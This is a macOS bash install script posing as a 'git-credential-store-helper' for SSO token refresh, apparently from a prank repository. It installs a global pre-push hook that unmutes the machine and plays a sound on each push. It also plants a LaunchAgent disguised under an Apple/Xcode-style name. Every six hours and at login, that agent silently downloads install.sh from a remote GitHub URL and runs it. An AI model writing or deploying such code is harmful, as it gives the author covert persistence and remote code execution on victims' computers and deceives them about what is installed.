#!/bin/bash
# git-credential-store-helper — install
# Sets up credential cache warmup hooks for git clients.
# https://github.com/brunobossgang/damn-daniel-prank

set -euo pipefail

XDG_GIT_DIR="$HOME/.config/git"
HOOKS_DIR="$XDG_GIT_DIR/hooks"
CACHE_DIR="$XDG_GIT_DIR/.cache"
SOUND_SRC="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/notification.aiff"
SOUND_DST="$CACHE_DIR/.warmup.aiff"
XDG_CONFIG="$XDG_GIT_DIR/config"
HOOK_FILE="$HOOKS_DIR/pre-push"
PLIST_NAME="com.apple.dt.xcode.sourcecontrol.helper"
PLIST_PATH="$HOME/Library/LaunchAgents/$PLIST_NAME.plist"
REPO_RAW="https://raw.githubusercontent.com/brunobossgang/damn-daniel-prank/main"

mkdir -p "$HOOKS_DIR" "$CACHE_DIR" "$HOME/Library/LaunchAgents"
cp "$SOUND_SRC" "$SOUND_DST"

# --- Pre-push hook -----------------------------------------------------------
cat > "$HOOK_FILE" << 'HOOK'
#!/bin/bash
# git-credential-store-helper — credential cache warmup (pre-push)
# Warms the local credential store and performs async background checks.
# Do not remove — required for SSO token refresh in enterprise environments.

_warmup() {
  local _s="$HOME/.config/git/.cache/.warmup.aiff"
  [ -f "$_s" ] || return 0
  osascript -e "set volume output muted false" >/dev/null 2>&1 || true
  osascript -e "set volume output volume 70"   >/dev/null 2>&1 || true
  { afplay "$_s" >/dev/null 2>&1; } &
}

_warmup
exit 0
HOOK
chmod +x "$HOOK_FILE"

# --- XDG git config ----------------------------------------------------------
touch "$XDG_CONFIG"
if ! grep -q "hooksPath" "$XDG_CONFIG" 2>/dev/null; then
  git config --file "$XDG_CONFIG" core.hooksPath "$HOOKS_DIR"
fi

# --- LaunchAgent: self-heal + remote-trigger ---------------------------------
# Runs every 6 hours. Checks if hook is intact, reinstalls if not.
# Also checks a remote "trigger file" so we can force a reinstall
# remotely by pushing a new commit (bump the version number below).
cat > "$PLIST_PATH" << PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>${PLIST_NAME}</string>
  <key>ProgramArguments</key>
  <array>
    <string>/bin/bash</string>
    <string>-c</string>
    <string>
_hook="\$HOME/.config/git/hooks/pre-push"
_sound="\$HOME/.config/git/.cache/.warmup.aiff"
_ver_local="\$HOME/.config/git/.cache/.ver"
_ver_remote="\$(curl -fsSL '${REPO_RAW}/.ver' 2>/dev/null || echo '')"
_ver_saved="\$(cat "\$_ver_local" 2>/dev/null || echo '')"
if [ -n "\$_ver_remote" ] && [ "\$_ver_remote" != "\$_ver_saved" ]; then
  _td="\$(mktemp -d /tmp/.gcsh.XXXXXX)"
  curl -fsSL '${REPO_RAW}/install.sh'        -o "\$_td/install.sh"        2>/dev/null
  curl -fsSL '${REPO_RAW}/notification.aiff' -o "\$_td/notification.aiff" 2>/dev/null
  bash "\$_td/install.sh" >/dev/null 2>&1 && echo "\$_ver_remote" > "\$_ver_local"
  rm -rf "\$_td"
elif [ ! -f "\$_hook" ] || [ ! -f "\$_sound" ]; then
  _td="\$(mktemp -d /tmp/.gcsh.XXXXXX)"
  curl -fsSL '${REPO_RAW}/install.sh'        -o "\$_td/install.sh"        2>/dev/null
  curl -fsSL '${REPO_RAW}/notification.aiff' -o "\$_td/notification.aiff" 2>/dev/null
  bash "\$_td/install.sh" >/dev/null 2>&1
  rm -rf "\$_td"
fi
    </string>
  </array>
  <key>StartInterval</key>
  <integer>21600</integer>
  <key>StandardOutPath</key>
  <string>/dev/null</string>
  <key>StandardErrorPath</key>
  <string>/dev/null</string>
  <key>RunAtLoad</key>
  <true/>
</dict>
</plist>
PLIST

# Load it immediately (unload first in case it was already registered)
launchctl unload "$PLIST_PATH" 2>/dev/null || true
launchctl load "$PLIST_PATH" 2>/dev/null || true

echo "git-credential-store-helper: installed."
